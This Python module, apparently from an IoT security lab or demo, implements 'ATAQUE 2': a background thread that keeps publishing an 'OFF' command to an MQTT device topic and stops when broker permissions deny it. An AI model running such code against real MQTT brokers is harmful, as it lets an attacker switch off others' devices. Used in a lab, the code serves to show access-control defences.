import threading
import time

from config import ATTACK2_INTERVAL, MQTT_SET_TOPIC
from mqtt_service import publish_to_topic
from state import (
    attack2_lock,
    get_attack2_thread,
    is_attack2_running,
    set_attack2_running,
    set_attack2_thread,
)
from utils import add_event


def attack2_worker() -> None:
    add_event('warn', '🚨 ATAQUE 2 INICIADO')

    try:
        while is_attack2_running():
            ok, msg, denied = publish_to_topic(MQTT_SET_TOPIC, {'state': 'OFF'})
            if not ok and denied:
                add_event('warn', 'Ataque 2 bloqueado por permisos MQTT')
                break
            time.sleep(ATTACK2_INTERVAL)
    except Exception as exc:
        add_event('error', f'Ataque2 error: {exc}')
    finally:
        set_attack2_running(False)
        set_attack2_thread(None)
        add_event('info', '🛑 ATAQUE 2 DETENIDO')


def start_attack2() -> tuple[bool, str]:
    with attack2_lock:
        thread = get_attack2_thread()
        already_running = is_attack2_running() and thread is not None and thread.is_alive()
        if already_running:
            return False, 'ATAQUE 2 ya activo'

        set_attack2_running(True)
        thread = threading.Thread(target=attack2_worker, daemon=True, name='attack2-worker')
        set_attack2_thread(thread)
        thread.start()
        return True, 'ATAQUE 2 ACTIVADO 💥'


def stop_attack2() -> str:
    set_attack2_running(False)
    return 'ATAQUE 2 DESACTIVADO 🛑'
